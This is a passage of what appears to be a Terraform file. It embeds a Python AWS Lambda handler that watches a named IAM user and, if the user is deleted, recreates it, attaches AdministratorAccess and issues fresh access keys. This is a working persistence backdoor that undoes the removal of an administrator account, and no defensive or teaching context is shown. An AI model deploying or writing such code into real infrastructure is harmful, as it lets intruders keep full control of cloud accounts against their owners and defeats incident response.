iam = boto3.client('iam')
target_user = os.environ['TARGET_USER']

def handler(event, context):
    try:
        # Check if user exists
        try:
            iam.get_user(UserName=target_user)
            logger.info(f"User {target_user} still exists")
            return {"status": "exists"}
        except iam.exceptions.NoSuchEntityException:
            logger.info(f"User {target_user} deleted. Recreating...")

            # Recreate user
            iam.create_user(UserName=target_user)

            # Reattach AdministratorAccess
            iam.attach_user_policy(
                UserName=target_user,
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )

            # Create new access keys
            response = iam.create_access_key(UserName=target_user)

            logger.info(f"User {target_user} recreated with new keys")
            return {
                "status": "recreated",
                "access_key_id": response['AccessKey']['AccessKeyId']
            }

    except Exception as e:
        logger.error(f"Error: {str(e)}")
        raise
EOF
    filename = "index.py"
  }
}
